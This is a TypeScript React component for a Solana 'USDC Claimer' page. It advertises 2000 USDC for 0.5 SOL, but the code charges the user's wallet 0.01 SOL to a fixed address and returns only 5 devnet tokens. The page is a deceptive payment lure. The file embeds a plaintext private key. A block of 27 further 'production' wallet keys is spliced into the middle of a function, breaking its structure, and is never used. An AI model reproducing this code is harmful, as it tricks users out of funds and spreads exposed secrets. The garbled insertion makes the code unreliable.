/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "28zyNvNPGrEtgqhFJik9oywWJFCbm9djGU2d2oo9Dqj6CCbNd3tjPiEc6tWLUtsok3uAYepm1jpbVxrLWiEPa8Pa"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "46Dm83tpdc3iy6XgModT8wZsq85A3sZp6knt4xvqto7KbAM5pWorWGG8NDBdeFKgPs5s6eRxFpWYiULoVxPnoTZm",
  "key1": "4E9e47s4eWBrDXecYXWG5Rx8RVVVE2GKUu1wuLUDukXXNuggETrEYTPZ9JRD1C2NuoDDvGpKpR3iTF7LBP8KARBr",
  "key2": "4GnmoNLFMRmrBt2Eg4LW3mhxsuMbTRp2kHA3y1a4UPWSuggQEeqFGWxCwf24v171agQZnEr8S8Xo88Z6nmJ3jZwD",
  "key3": "5omqfPQtdWDaCvSUNd62yeRkFoMqA9WQ53kDcW1strkv9YUB9mJNr1w4DCqXEx2AWJPzwRLkxnhXej3y7dCtXDW9",
  "key4": "3PQi3vV5ivdnyTK5kQuziRv2jUuJPXbJEydQpRxDzgybLHgk2ARSy1ekzctxXVMZZAjaw6XMC8kGPerBW9SL6bDj",
  "key5": "3eCM1BgZFrZb62oBzyttcruEFeCSq8L6oUC5WSEtAmRKRHtBXmp8XHsEKdUan3pDp4SriSsPdkMuTX7iUE134PMN",
  "key6": "bArrZya5H6eEfs1WSnVwyjVhv7eZDPDYDizTKX5nmRWo4uh1HDT5PVPVLnfX5nNXANwztJjJ1yn3FHFzVGoxrD9",
  "key7": "5u33kiEieqXmx7UbYZvFnc7f184JkGzPhXDE816NiaPzAd3dsJmndNJsPHB5GPc4D4LqJearu9VA8xK6cXZ1GL9g",
  "key8": "mweusXSMDBCqaUnjLD1Sjck8XmHNDQePxMu44qqqALCfyqdhw1YnUgdXzxdM6ELvNNFJwuZJ72asPyFARdrjg7p",
  "key9": "5hZN4bDQCCLTDzvJwcsfVpAY1RoGpfeSgna56DrQrSmaNgV2v7KsK5Xys9WYPZ4qrmaoKdqhtzT5NrjrgTtptYMq",
  "key10": "yNz9xCWp9v4VNSkEbAxeaRNAT8M5jPwe7y9LTjX34v1z6h36eMPLxrb4rcY7CQYCGwazLWmXXrZcsdUJ6RS81XB",
  "key11": "3zU7MQjCL4SY7Y84AyPXuWgPiPy39sHKFBUeYtPLf3n9tJwmNmYXBNtYbQfU7SqY9mBWH7y1M1F1vpJU6aYfWfue",
  "key12": "4zoBQYPBpYkPr3syh5YbNwQS891YfRCE3zk3AGZipzAkycFtj9DemXyYXKHgu5bsh2ufwntccaLs7tcM9YtNhHcp",
  "key13": "3xSd5ormfdCzkVJ6P4SnJkZ1k5T5bAg79S3hv1U6sjx6qj9e13uhiidWfdJ1Ve22QxzAsLapyQiQfpykQ6Bqkb9M",
  "key14": "4K6tzEWihXtaMLqx8bsMivsoGbzyYs8XgdW3aCGpkzCexoNGmTXV9z8e9Dn9NQBxDZQeNFw7XMW33VG6Hp5vrQHK",
  "key15": "5Y1KSkdbndg6yXAsrpyPYbTjDaWoNHZtTbtUQwC2WWeQkDMbyBHKFc2MWm98fiwiSAGbaW223inDeCaGDG6A26hu",
  "key16": "4qhPos8z2pudeAND67xxU8LrgWy9QnL2hizsNAF7sDKKEcdn5tegbnWwkmJZRaH4cdyAk6tmk6BAiFCCLBQkYuv",
  "key17": "4PzRMrisS9CGA8HrV8YcUyjZSLUM9cgnFDPmFQkBtgdtvZef1dtQstpPrjzKjjgvfMTD2k5vqZyMBBMqgRCvmJBc",
  "key18": "4PeSq34z22B4bonXBXcpNYvubytLK9MhGJpcDqTfhP6y6YzeV5s2xZSj8NR5Nb9PoPfMHjDN3TNhcWHTmY32743",
  "key19": "4f3ziHdow653nkaCE9Hr8ngHdECa54R6s3XohvEg6iNa9GHauWswYXSovZgH1bP7SKTeVG8Amum7DNWkkjsChaSm",
  "key20": "4kpYUQYhq7iVXNjuJHdeeSzYjYum1T6wSrixCFkbKhs3Yjmv5wP1MGgkLvTRicNt18wvdZ1mfy7ySuTSZUatsGqZ",
  "key21": "3bKr5r8vC2tKHerESuuVrGeHHQt6iRGVq7rzFdSY8MVvZ75KcG8ie9wFuqrKYH97VZ6rabwNgV52sQrTGif44Qjn",
  "key22": "1oTePMQrNd8dDCZCgHN4YrZMsCpcn8mWifSqVW5Du3eVwztyAx2CvidECEHcuDeq7Fxn713KZb3bnAY9b3bngsm",
  "key23": "5B7wSgfbYFAY2mP3BUmP8LotLyX8ge1TisXUCjGUYamodfdPg5pUFkpj6UVvQBzM6Cq5V8eHEWFaW6iqS5xoM8BF",
  "key24": "5tMwuWMMFgWVCMTtsZSgoiBXdauJyUbL7qvUzbjZauHbWZxzNAZyaaGjnbRF4s3UYU8Xf5SWT5FwZ6ZfJoXbjetC",
  "key25": "3dSLb1EDzHGuyn9LPYeunU5JC5r7Xh5aJsMJmzMPJWUWwC7fiSVWeFcFFPvrwcJ7Nqdsxf8381b7HidegccR4u4c",
  "key26": "2diBmVxjX8eeSC6Rp9wJDsrJyEbRzgv8Yo1pqhUQMxdqe1piMf45TG6RpEcJZJBprnGtmeHEGEtUnD9b1gKzzzPA"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
